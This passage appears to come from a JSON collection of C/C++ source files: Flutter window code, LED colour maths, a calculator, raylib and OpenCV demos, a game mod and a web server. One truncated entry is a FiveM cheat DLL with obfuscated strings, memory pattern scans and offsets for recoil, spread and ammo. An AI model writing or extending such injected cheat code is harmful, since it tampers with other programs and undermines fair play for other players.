Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mlapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"NeoSPI.h\"\n#include <iostream>\n#include <unistd.h>\n\nint pix = 100;\n\nNeoSPI strip;\n\n\nstatic const uint8_t _NeoPixelGammaTable[256] = {\n    0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,\n    0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   1,   1,\n    1,   1,   1,   1,   1,   1,   2,   2,   2,   2,   2,   2,   2,   2,   3,\n    3,   3,   3,   3,   3,   4,   4,   4,   4,   5,   5,   5,   5,   5,   6,\n    6,   6,   6,   7,   7,   7,   8,   8,   8,   9,   9,   9,   10,  10,  10,\n    11,  11,  11,  12,  12,  13,  13,  13,  14,  14,  15,  15,  16,  16,  17,\n    17,  18,  18,  19,  19,  20,  20,  21,  21,  22,  22,  23,  24,  24,  25,\n    25,  26,  27,  27,  28,  29,  29,  30,  31,  31,  32,  33,  34,  34,  35,\n    36,  37,  38,  38,  39,  40,  41,  42,  42,  43,  44,  45,  46,  47,  48,\n    49,  50,  51,  52,  53,  54,  55,  56,  57,  58,  59,  60,  61,  62,  63,\n    64,  65,  66,  68,  69,  70,  71,  72,  73,  75,  76,  77,  78,  80,  81,\n    82,  84,  85,  86,  88,  89,  90,  92,  93,  94,  96,  97,  99,  100, 102,\n    103, 105, 106, 108, 109, 111, 112, 114, 115, 117, 119, 120, 122, 124, 125,\n    127, 129, 130, 132, 134, 136, 137, 139, 141, 143, 145, 146, 148, 150, 152,\n    154, 156, 158, 160, 162, 164, 166, 168, 170, 172, 174, 176, 178, 180, 182,\n    184, 186, 188, 191, 193, 195, 197, 199, 202, 204, 206, 209, 211, 213, 215,\n    218, 220, 223, 225, 227, 230, 232, 235, 237, 240, 242, 245, 247, 250, 252,\n    255};\n\n\nstatic uint8_t gamma8(uint8_t x) {\n    return _NeoPixelGammaTable[x]; // 0-255 in, 0-255 out\n  }\n\n\nvoid int2RGB(uint16_t n, uint32_t c)\n{\n  uint8_t *p, r = (uint8_t)(c >> 16), g = (uint8_t)(c >> 8), b = (uint8_t)c;\n  strip.setPixelRGB(r,g,b,n);\n}\n\nuint32_t ColorHSV(uint16_t hue, uint8_t sat = 255, uint8_t val = 255) {\n\n  uint8_t r, g, b;\n\n  // Remap 0-65535 to 0-1529. Pure red is CENTERED on the 64K rollover;\n  // 0 is not the start of pure red, but the midpoint...a few values above\n  // zero and a few below 65536 all yield pure red (similarly, 32768 is the\n  // midpoint, not start, of pure cyan). The 8-bit RGB hexcone (256 values\n  // each for red, green, blue) really only allows for 1530 distinct hues\n  // (not 1536, more on that below), but the full unsigned 16-bit type was\n  // chosen for hue so that one's code can easily handle a contiguous color\n  // wheel by allowing hue to roll over in either direction.\n  hue = (hue * 1530L + 32768) / 65536;\n  // Because red is centered on the rollover point (the +32768 above,\n  // essentially a fixed-point +0.5), the above actually yields 0 to 1530,\n  // where 0 and 1530 would yield the same thing. Rather than apply a\n  // costly modulo operator, 1530 is handled as a special case below.\n\n  // So you'd think that the color \"hexcone\" (the thing that ramps from\n  // pure red, to pure yellow, to pure green and so forth back to red,\n  // yielding six slices), and with each color component having 256\n  // possible values (0-255), might have 1536 possible items (6*256),\n  // but in reality there's 1530. This is because the last element in\n  // each 256-element slice is equal to the first element of the next\n  // slice, and keeping those in there this would create small\n  // discontinuities in the color wheel. So the last element of each\n  // slice is dropped...we regard only elements 0-254, with item 255\n  // being picked up as element 0 of the next slice. Like this:\n  // Red to not-quite-pure-yellow is:        255,   0, 0 to 255, 254,   0\n  // Pure yellow to not-quite-pure-green is: 255, 255, 0 to   1, 255,   0\n  // Pure green to not-quite-pure-cyan is:     0, 255, 0 to   0, 255, 254\n  // and so forth. Hence, 1530 distinct hues (0 to 1529), and hence why\n  // the constants below are not the multiples of 256 you might expect.\n\n  // Convert hue to R,G,B (nested ifs faster than divide+mod+switch):\n  if (hue < 510) { // Red to Green-1\n    b = 0;\n    if (hue < 255) { //   Red to Yellow-1\n      r = 255;\n      g = hue;       //     g = 0 to 254\n    } else {         //   Yellow to Green-1\n      r = 510 - hue; //     r = 255 to 1\n      g = 255;\n    }\n  } else if (hue < 1020) { // Green to Blue-1\n    r = 0;\n    if (hue < 765) { //   Green to Cyan-1\n      g = 255;\n      b = hue - 510;  //     b = 0 to 254\n    } else {          //   Cyan to Blue-1\n      g = 1020 - hue; //     g = 255 to 1\n      b = 255;\n    }\n  } else if (hue < 1530) { // Blue to Red-1\n    g = 0;\n    if (hue < 1275) { //   Blue to Magenta-1\n      r = hue - 1020; //     r = 0 to 254\n      b = 255;\n    } else { //   Magenta to Red-1\n      r = 255;\n      b = 1530 - hue; //     b = 255 to 1\n    }\n  } else { // Last 0.5 Red (quicker than % operator)\n    r = 255;\n    g = b = 0;\n  }\n\n  // Apply saturation and value to R,G,B, pack into 32-bit result:\n  uint32_t v1 = 1 + val;  // 1 to 256; allows >>8 instead of /255\n  uint16_t s1 = 1 + sat;  // 1 to 256; same reason\n  uint8_t s2 = 255 - sat; // 255 to 0\n  return ((((((r * s1) >> 8) + s2) * v1) & 0xff00) << 8) |\n         ",
    "#include <bits/stdc++.h>\r\n#include <cmath>\r\n#include <math.h>\r\n#define long long ll\r\nusing namespace std;\r\nstring input = \"\", tmp = \"\";\r\nvector<string> list_num;\r\nvector<char> num;\r\nfloat _tmp;\r\nbool is_number(string &s)\r\n{\r\n    float v;\r\n    try\r\n    {\r\n        v = stof(s);\r\n    }\r\n    catch (const exception &e)\r\n    {\r\n        return false;\r\n    }\r\n    return true;\r\n\r\n    // isdigit(s.c_str());\r\n\r\n    // int cnt=0;\r\n    // for (char c : s) {\r\n    //     if(c=='.') cnt++;\r\n    //     if ((!isdigit(c)&&c!='.')||cnt>1) {\r\n    //         return false;\r\n    //     }\r\n    // }\r\n    // return true;\r\n}\r\nfloat calc(string &func_type, string &param)\r\n{\r\n    float val;\r\n    // func = list_num[i].substr(0, 3);\r\n    // func_param = list_num[i].substr(4, list_num[i].length() - 5);\r\n    if (func_type == \"sin\")\r\n    {\r\n        val = sin(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"cos\")\r\n    {\r\n        val = cos(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"tan\")\r\n    {\r\n        val = tan(stof(param) * (M_PI / 180));\r\n    }\r\n    else if (func_type == \"num\")\r\n    {\r\n        val = stof(param);\r\n    }\r\n    else\r\n    {\r\n        cerr << \"Error:Please use cos,tan or num.\";\r\n        return 0x7fffffff;\r\n    }\r\n\r\n    return val;\r\n}\r\n\r\nfloat count()\r\n{\r\n    string func, func_param;\r\n    if (is_number(list_num[0]))\r\n    {\r\n        func = \"num\";\r\n        func_param = list_num[0];\r\n    }\r\n    else\r\n    {\r\n        func = list_num[0].substr(0, 3);\r\n        func_param = list_num[0].substr(4, list_num[0].length() - 5);\r\n    }\r\n    float func_val = calc(func, func_param);\r\n    for (int i = 1; i < list_num.size(); i++)\r\n    {\r\n        if (is_number(list_num[i]))\r\n        {\r\n            func = \"num\";\r\n            func_param = list_num[i];\r\n        }\r\n        else\r\n        {\r\n            func = list_num[i].substr(0, 3);\r\n            func_param = list_num[i].substr(4, list_num[i].length() - 5);\r\n        }\r\n        float func_val_temp = calc(func, func_param);\r\n        switch (num[i - 1])\r\n        {\r\n        case '*':\r\n            func_val *= func_val_temp;\r\n            break;\r\n        case '+':\r\n            func_val += func_val_temp;\r\n            break;\r\n        case '-':\r\n            func_val -= func_val_temp;\r\n            break;\r\n        case '/':\r\n            func_val /= func_val_temp;\r\n            break;\r\n        }\r\n    }\r\n    return func_val;\r\n}\r\nvoid split(string &data)\r\n{   \r\n    for (int i = 0; i < data.size(); i++)\r\n    {\r\n        if (data[i] == '+' || data[i] == '-' || data[i] == '*' || data[i] == '/')\r\n        {\r\n            if(tmp==\"\"&&data[i]=='-'){\r\n                tmp+=data[i];\r\n                continue;\r\n            }\r\n            list_num.push_back(tmp);\r\n            num.push_back(data[i]);\r\n            tmp = \"\";\r\n        }\r\n        else if (i == data.size() - 1)\r\n        {\r\n            tmp += data[i];\r\n            list_num.push_back(tmp);\r\n            tmp = \"\";\r\n            break;\r\n        }\r\n        else\r\n        {\r\n            tmp += data[i];\r\n        }\r\n    }\r\n}\r\nint main()\r\n{\r\n    // OK: sin(90)+sin(90)+sin(90)-sin(90)\r\n    // NG: sin(90)+num(90) Not Acceptable\r\n    // OK: sin(90)+9999999\r\n    // OK: sin(90)+(sin(90)+0.5)\r\n\r\n    cin >> input;\r\n    split(input);\r\n    float ans = count();\r\n    if (ans != 0x7fffffff)\r\n    {\r\n        cout << \"The answer is:\" << ans;\r\n    }\r\n    else\r\n    {\r\n        return -1;\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "/*******************************************************************************************\n*\n*   raylib [textures] example - Retrieve image data from texture: LoadImageFromTexture()\n*\n*   NOTE: Images are loaded in CPU memory (RAM); textures are loaded in GPU memory (VRAM)\n*\n*   Example originally created with raylib 1.3, last time updated with raylib 4.0\n*\n*   Example licensed under an unmodified zlib/libpng license, which is an OSI-certified,\n*   BSD-like license that allows static linking with closed source software\n*\n*   Copyright (c) 2015-2024 Ramon Santamaria (@raysan5)\n*\n********************************************************************************************/\n\n#include \"raylib.h\"\n\n//------------------------------------------------------------------------------------\n// Program main entry point\n//------------------------------------------------------------------------------------\nint main(void)\n{\n    // Initialization\n    //--------------------------------------------------------------------------------------\n    const int screenWidth = 800;\n    const int screenHeight = 450;\n\n    InitWindow(screenWidth, screenHeight, \"raylib [textures] example - texture to image\");\n\n    // NOTE: Textures MUST be loaded after Window initialization (OpenGL context is required)\n\n    Image image = LoadImage(\"assets/raylib_logo.png\");  // Load image data into CPU memory (RAM)\n    Texture2D texture = LoadTextureFromImage(image);       // Image converted to texture, GPU memory (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload image data from CPU memory (RAM)\n\n\n    image = LoadImageFromTexture(texture);                 // Load image from GPU texture (VRAM -> RAM)\n    UnloadTexture(texture);                                // Unload texture from GPU memory (VRAM)\n\n    texture = LoadTextureFromImage(image);                 // Recreate texture from retrieved image data (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload retrieved image data from CPU memory (RAM)\n    //---------------------------------------------------------------------------------------\n\n    // Main game loop\n    while (!WindowShouldClose())    // Detect window close button or ESC key\n    {\n        // Update\n        //----------------------------------------------------------------------------------\n        // TODO: Update your variables here\n        //----------------------------------------------------------------------------------\n\n        // Draw\n        //----------------------------------------------------------------------------------\n        BeginDrawing();\n\n            ClearBackground(RAYWHITE);\n\n            DrawTexture(texture, screenWidth/2 - texture.width/2, screenHeight/2 - texture.height/2, WHITE);\n\n            DrawText(\"this IS a texture loaded from an image!\", 300, 370, 10, GRAY);\n\n        EndDrawing();\n        //----------------------------------------------------------------------------------\n    }\n\n    // De-Initialization\n    //--------------------------------------------------------------------------------------\n    UnloadTexture(texture);       // Texture unloading\n\n    CloseWindow();                // Close window and OpenGL context\n    //--------------------------------------------------------------------------------------\n\n    return 0;\n}",
    "#include \"nsmb.hpp\"\n\nstruct StageLight {\n\tVecFx16 direction;\n\tGXRgb color;\n\tGXRgb diffuse;\n\tGXRgb ambient;\n\tGXRgb emission;\n};\n\nstatic const StageLight newViewLightingTable[] = {\n\t// 0: Normal\n\t{{0,-1.0fxs,-1.0fxs}, GX_RGB(31,31,31), GX_RGB(31,31,31), GX_RGB(6,6,6), GX_RGB(10,9,8)}, \n\n\t// 1: World 8 Outside\n\t{{-0.1875fxs,0.625fxs,-1.0fxs}, GX_RGB(27,31,31), GX_RGB(31,31,31), GX_RGB(6,6,6), GX_RGB(10,9,8)}, \n\n\t// 2: Castle/Ghost house\n\t{{0,1.0fxs,-1.0fxs}, GX_RGB(31,31,31), GX_RGB(31,31,31), GX_RGB(6,6,6), GX_RGB(10,9,8)},\n\n\t// 3: Jungle/Outside water\n\t{{-1.0fxs,-5.875fxs,-3.0fxs}, GX_RGB(31,31,31), GX_RGB(31,31,31), GX_RGB(6,6,6), GX_RGB(10,9,8)},\n\t\n\t// 4: Sunset (unused)\n\t{{1.0fxs,7.0fxs,-4.0fxs}, GX_RGB(31,31,31), GX_RGB(31,31,31), GX_RGB(15,6,6), GX_RGB(19,16,0)},\n\t\n\t// 5: Underwater\n\t{{-0.375fxs,-0.1875fxs,-1.0fxs}, GX_RGB(31,31,31), GX_RGB(31,31,31), GX_RGB(6,6,6), GX_RGB(10,9,8)},\n\n\t// ---------------- YOUR NEW LIGHTING ---------------- //\n\t\n\t// REMEMBER: 1.0fxs = 0x1000, values cannot be >= 8.0fxs or <= -8.0fxs;\n\t//\t\t\t 31 is max value for RGB\n\n\t// 6: example - purple gradient\n\t{\n\t\t{1.0fxs,5.0fxs,-1.0fxs}, \t// light direction\n\t\tGX_RGB(31,0,31),\t\t// colour\n\t\tGX_RGB(31,31,31),\t\t// diffuse\n\t\tGX_RGB(10,0,10),\t\t// ambient\n\t\tGX_RGB(0,0,25),\t\t\t// emission\n\n\t},\n\n\t// 7: example - heat lamp\n\t{\n\t\t{-6.0fxs,0.5fxs,-1.0fxs}, \n\t\tGX_RGB(31,28,27),\t\t\n\t\tGX_RGB(31,31,31),\t\t\n\t\tGX_RGB(20,6,5),\t\t\n\t\tGX_RGB(20,5,5),\t\t\n\n\t},\n\n\t// 8: example - silhouette\n\t{\n\t\t{0,0,0}, \n\t\tGX_RGB(0,0,0),\t\t\n\t\tGX_RGB(0,0,0),\t\n\t\tGX_RGB(0,0,0),\t\t\n\t\tGX_RGB(0,0,0),\t\t\n\n\t}\n\n\t// --------------------------------------------------- //\n};\n\n\n// replaces view lighting table pointer with ours\nncp_over(0x020a3c28,0) static auto* newLightingTablePtr = &newViewLightingTable;\n\n// skips a check to allow lighting IDs above 5\nncp_repl(0x020a3b2c,0,\"b 0x020a3b34\");\n",
    "/**\n * @file main.cpp\n * @author Fansure Grin\n * @date 2024-03-30\n * @brief the enter of this webserver project\n*/\n#include \"server/webserver.h\"\n\n\nint main(int argc, char* argv[]) {\n    // char src_dir[] = \"/home/fansuregrin/workshop/my_http_server/resources\";\n    // WebServer server(\n    //     \"0.0.0.0\",      // \u76d1\u542c\u7684 IP \u5730\u5740\n    //     7777,           // \u76d1\u542c\u7684\u7aef\u53e3\u53f7\n    //     60000,          // \u5b9a\u65f6\u65f6\u95f4\n    //     true,           // \u5f00\u542f linger\n    //     3,              // \u76d1\u542csocket \u548c \u8fde\u63a5socket \u4e0a\u89e6\u53d1\u4e8b\u4ef6\u7684\u6a21\u5f0f\n    //     \"localhost\",    // MySQL \u7684\u670d\u52a1\u5730\u5740\n    //     3306,           // MySQL \u7684\u7aef\u53e3\u53f7\n    //     \"mysql_user\",   // MySQL \u7684\u8d26\u6237\u540d\u79f0\n    //     \"password\",     // MySQL \u7684\u8d26\u6237\u5bc6\u7801\n    //     \"webserver\",    // \u8981\u8fde\u63a5\u7684\u6570\u636e\u5e93\u540d\u79f0\n    //     2,              // MySQL \u6570\u636e\u5e93\u8fde\u63a5\u6c60\u4e2d\u7684\u8fde\u63a5\u4e2a\u6570\n    //     true,           // \u662f\u5426\u5f00\u542f\u65e5\u5fd7\n    //     1,              // \u65e5\u5fd7\u7b49\u7ea7\n    //     10,             // \u65e5\u5fd7\u6a21\u5757\u4e2d\u963b\u585e\u961f\u5217\u7684\u5927\u5c0f\n    //     \"./logs\",       // \u5b58\u653e\u65e5\u5fd7\u6587\u4ef6\u7684\u8def\u5f84\n    //     src_dir,        // \u9759\u6001\u8d44\u6e90\u6839\u76ee\u5f55\n    //     2               // \u7ebf\u7a0b\u6c60\u4e2d\u7ebf\u7a0b\u7684\u6570\u91cf\n    // );\n\n    string cfg_fp(\"./server.cfg\");\n    if (argc > 1) {\n        cfg_fp = argv[1];\n    }\n\n    Config cfg(cfg_fp);\n    WebServer server(cfg);\n    \n    server.start();\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//\n// Created by Alan on 2024/4/2.\n//\n#include <opencv2/opencv.hpp>\n#include <iostream>\n#include <fstream>\n\nusing namespace cv;\nusing namespace std;\n\nint main() {\n    // \u6253\u5f00\u89c6\u9891\u6587\u4ef6\n//    string videoPath = \"../cars.mp4\";\n//    string videoPath = \"../234_1712047332.mp4\";\n    string videoPath = \"../ball.mp4\";\n//    string videoPath = \"../\u9e21\u4f60\u592a\u7f8e.mp4\";\n    // \u9996\u5148\u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728\n    ifstream file(videoPath);\n    if (!file.good()) {\n        cerr << \"Error: File not found or cannot be opened: \" << videoPath << endl;\n        return -1;\n    }\n\n    // \u6253\u5f00\u89c6\u9891\u6587\u4ef6\n    VideoCapture capture(videoPath);\n    if (!capture.isOpened()) {\n        cerr << \"Error opening video file: \" << videoPath << endl;\n        return -1;\n    }\n\n    // \u8bfb\u53d6\u7b2c\u4e00\u5e27\n    Mat frame;\n    capture >> frame;\n    if (frame.empty()) {\n        cerr << \"Error reading video\" << endl;\n        return -1;\n    }\n\n    imshow(\"Frame\", frame);\n    waitKey(1);  // \u77ed\u6682\u7b49\u5f85\u786e\u4fdd\u56fe\u50cf\u663e\u793a\n\n    // \u9009\u62e9\u8ddf\u8e2a\u76ee\u6807\n    Rect track_window = selectROI(\"Tracking\", frame, true, false);\n    if (track_window.width <= 0 || track_window.height <= 0) {\n        cerr << \"Error: Track window has invalid size.\" << endl;\n        cerr << \"track_window.width = \" << track_window.width << endl;\n        cerr << \"track_window.height = \" << track_window.height << endl;\n        cerr << \"track_window.size() = \" << track_window.size() << endl;\n        cout << \"Selected ROI: \" << track_window << endl;\n        return -1;\n    } else {\n        cout << \"Selected ROI: \" << track_window << endl;\n    }\n\n\n    // \u8bbe\u7f6eROI\uff08\u611f\u5174\u8da3\u533a\u57df\uff09\u7528\u4e8e\u8ddf\u8e2a\n    Mat roi = frame(track_window);\n    if (roi.empty()) {\n        cerr << \"Error: ROI is empty.\" << endl;\n        return -1;\n    }\n\n    // \u5c06ROI\u8f6c\u6362\u4e3aHSV\u989c\u8272\u7a7a\u95f4\n\n    Mat hsv_roi, mask;\n    cvtColor(roi, hsv_roi, COLOR_BGR2HSV);\n\n\n\n\n\n    inRange(hsv_roi, Scalar(0, 60, 32), Scalar(180, 255, 255), mask);\n\n//    // 